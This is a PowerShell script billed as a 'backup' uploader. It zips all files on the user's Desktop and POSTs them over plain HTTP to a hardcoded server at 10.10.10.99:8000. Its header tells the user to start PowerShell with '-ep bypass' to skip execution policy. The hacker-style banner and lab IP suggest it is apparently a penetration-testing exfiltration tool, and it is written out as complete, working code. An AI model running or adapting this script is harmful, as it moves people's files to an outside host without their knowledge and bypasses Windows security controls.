<#
 ┓      ┓       ┓  ┓   
┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
           ┛          ┛
┳┓┏┓┓┏┏┓┏┓┓┏┓          
┃┃ ┫┣┫┣┫┃ ┃┫           
┻┛┗┛┛┗┛┗┗┛┛┗┛  

Simple File uploader designed for backup operators
Change $Server ip address to linux ip address before using that script
Before using this script start powershell with "powershell -ep bypass"
Server Parameters. Change Server ip address to your Linux Server Address
Researched by d3hvck, Refined by Ilyas Vahidzade "https://www.linkedin.com/in/ilyas-vahidzade-071767236/"
Automated for backup your Desktop Files as a Zip file and sending it to Linux Server

#>

param(
    [string]$Server = "10.10.10.99",
    [int]$Port = 8000,
    [string]$FilePath = "$env:USERPROFILE\Desktop\*.*"
)

Write-Host "[*] Starting file upload to ${Server}:${Port}..." -ForegroundColor Cyan

# Zip
if ($FilePath -like "*\**") {
    Write-Host "[*] Multiple files detected, creating ZIP..." -ForegroundColor Yellow
    
    $files = Get-ChildItem -Path $FilePath -File -ErrorAction SilentlyContinue
    if ($files.Count -eq 0) {
        Write-Host "[-] No files found: $FilePath" -ForegroundColor Red
        exit
    }
    
    $zipPath = "$env:TEMP\backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    try {
        Compress-Archive -Path $files.FullName -DestinationPath $zipPath -Force
        $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
        Write-Host "[+] ZIP created: $($files.Count) files, $($fileBytes.Length) bytes" -ForegroundColor Green
    } catch {
        Write-Host "[-] ZIP creation failed: $($_.Exception.Message)" -ForegroundColor Red
        exit
    }
} else {
    if (-not (Test-Path $FilePath)) {
        Write-Host "[-] File not found: $FilePath" -ForegroundColor Red
        exit
    }
    
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    Write-Host "[+] Single file: $($fileBytes.Length) bytes" -ForegroundColor Green
}

# Upload
$uri = "http://${Server}:${Port}/upload"

try {
    Write-Host "[*] Uploading to $uri..." -ForegroundColor Yellow
    
    $webClient = New-Object System.Net.WebClient
    $response = $webClient.UploadData($uri, "POST", $fileBytes)
    $responseText = [System.Text.Encoding]::UTF8.GetString($response)
    
    Write-Host "[+] Upload successful!" -ForegroundColor Green
    Write-Host "    Server response: $responseText" -ForegroundColor Yellow
    
} catch {
    Write-Host "[-] Upload failed: $($_.Exception.Message)" -ForegroundColor Red
}

# Cleanup
if ($zipPath -and (Test-Path $zipPath)) {
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}